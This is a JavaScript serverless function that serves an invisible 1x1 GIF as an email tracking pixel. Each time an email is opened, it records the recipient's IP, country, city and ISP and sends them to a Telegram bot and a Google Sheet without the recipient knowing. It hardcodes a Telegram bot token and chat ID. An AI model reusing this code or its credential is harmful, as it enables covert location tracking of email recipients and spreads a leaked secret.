// functions/track-email.js

const TELEGRAM_TOKEN = '8424656659:AAEbo9X2Kuw1QZDRPyu_Uy-SNg6T36vQoRg';
const CHAT_ID = '7203463194';
const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxnVaFc4YKZta4P5nDnM-eGAREM6PhUx-taNfoEeXspB9spwaAvTj_0FIL3Gc7EA4vZUQ/exec'; // نفس رابط الشيت

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
};

// دالة تحويل رمز الدولة لعلم
function getCountryFlag(countryCode) {
    if (!countryCode || countryCode === 'Unknown') return '🌍';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

export async function onRequestOptions() {
    return new Response(null, { status: 204, headers: corsHeaders });
}

export async function onRequestGet(context) {
    const request = context.request;
    const url = new URL(request.url);

    try {
        // استخراج البيانات من الرابط (UTM parameters)
        const campaign = url.searchParams.get('campaign') || 'unknown_email';
        const userId = url.searchParams.get('user') || 'N/A';

        // بيانات Cloudflare
        const ip = request.headers.get('CF-Connecting-IP') || 'Unknown';
        const country = request.cf?.country || 'Unknown';
        const city = request.cf?.city || 'Unknown';
        const isp = request.cf?.asOrganization || 'Unknown';
        const flag = getCountryFlag(country);
        const timestamp = new Date().toISOString().replace('T', ' @ ').split('.')[0] + ' UTC';

        // 1️⃣ رسالة التليجرام الخاصة بالإيميل
        const telegramMessage = `
📧 <b>𝗘𝗺𝗮𝗶𝗹 𝗢𝗽𝗲𝗻𝗲𝗱!</b>
━━━━━━━━━━━━━━━━━━━━

🎯 <b>𝗖𝗮𝗺𝗽𝗮𝗶𝗴𝗻</b>: ${campaign}
👤 <b>𝗨𝘀𝗲𝗿 𝗜𝗗</b>: ${userId}

🌐 <b>𝗚𝗲𝗼 & 𝗡𝗲𝘁𝘄𝗼𝗿𝗸</b>
• IP: <code>${ip}</code>
• Country: ${country} ${flag}
• City: ${city}
• ISP/ASN: ${isp}

⏱ <b>𝗧𝗶𝗺𝗲𝘀𝘁𝗮𝗺𝗽</b>
 ${timestamp}
        `.trim();

        // 2️⃣ بيانات جوجل شيت
        const sheetsData = {
            timestamp: timestamp,
            ip: ip,
            country: country,
            city: city,
            continent: request.cf?.continent || 'Unknown',
            isp: isp,
            utm_source: 'email',
            utm_medium: 'email_open',
            utm_campaign: campaign,
            utm_term: userId,
            utm_content: 'N/A',
            referrer: 'Email Client',
            page: 'Email Opened',
            device: 'Email Client', // تمييز خاص في الشيت
            os: 'N/A',
            browser: 'N/A',
            screenRes: '1x1',
            lang: 'N/A',
            timezone: 'N/A'
        };

        // إرسال لتليجرام والشيت
        const tgPromise = fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: telegramMessage, parse_mode: 'HTML' })
        });

        const sheetPromise = fetch(GOOGLE_SHEET_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(sheetsData)
        });

        await Promise.allSettled([tgPromise, sheetPromise]);

        // 3️⃣ الرد بصورة شفافة 1x1 بكسل (المهم جداً)
        // هذا الكود يولد صورة GIF شفافة بحجم 1x1 بكسل
        const pixelBase64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
        const pixelBuffer = Uint8Array.from(atob(pixelBase64), c => c.charCodeAt(0));

        return new Response(pixelBuffer, {
            status: 200,
            headers: { 
                'Content-Type': 'image/gif',
                'Cache-Control': 'no-store, no-cache, must-revalidate', // نمنع التخزين المؤيد ليحسبها في كل مرة يفتح فيها الإيميل
                ...corsHeaders 
            }
        });

    } catch (error) {
        // حتى لو حدث خطأ، يجب أن نرجع الصورة لكي لا يظهر خطأ للمرسل إليه
        const pixelBase64 = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
        const pixelBuffer = Uint8Array.from(atob(pixelBase64), c => c.charCodeAt(0));
        return new Response(pixelBuffer, {
            status: 200,
            headers: { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store' }
        });
    }
}